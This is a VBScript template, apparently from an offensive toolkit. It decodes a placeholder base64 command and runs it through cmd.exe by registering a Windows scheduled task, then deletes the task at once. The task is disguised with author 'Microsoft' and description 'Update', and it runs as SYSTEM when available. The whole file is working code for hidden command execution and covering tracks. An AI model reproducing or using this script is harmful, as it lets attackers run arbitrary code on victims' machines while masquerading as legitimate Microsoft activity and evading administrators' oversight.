Dim command
command = Base64StringDecode("REPLACE_ME_BASE64_COMMAND")

Const TriggerTypeDaily = 1
Const ActionTypeExec = 0
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim rootFolder
Set rootFolder = service.GetFolder("\")
Dim taskDefinition
Set taskDefinition = service.NewTask(0)
Dim regInfo
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Update"
regInfo.Author = "Microsoft"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
settings.DisallowStartIfOnBatteries = False
Dim triggers
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(7)
Dim Action
Set Action = taskDefinition.Actions.Create(ActionTypeExec)
Action.Path = "c:\windows\system32\cmd.exe"
Action.arguments = "/Q /c " & command
Dim objNet, LoginUser
Set objNet = CreateObject("WScript.Network")
LoginUser = objNet.UserName
If UCase(LoginUser) = "SYSTEM" Then
Else
LoginUser = Empty
End If
Call rootFolder.RegisterTaskDefinition("REPLACE_ME_TEMP_TASKNAME", taskDefinition, 6, LoginUser, , 3)
Call rootFolder.DeleteTask("REPLACE_ME_TEMP_TASKNAME",0)

Function Base64StringDecode(ByVal vCode)
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1
    BinaryStream.Open
    BinaryStream.Write oNode.nodeTypedValue
    BinaryStream.Position = 0
    BinaryStream.Type = 2
    ' All Format =>  utf-16le - utf-8 - utf-16le
    BinaryStream.CharSet = "utf-8"
    Base64StringDecode = BinaryStream.ReadText
    Set BinaryStream = Nothing
    Set oNode = Nothing
End Function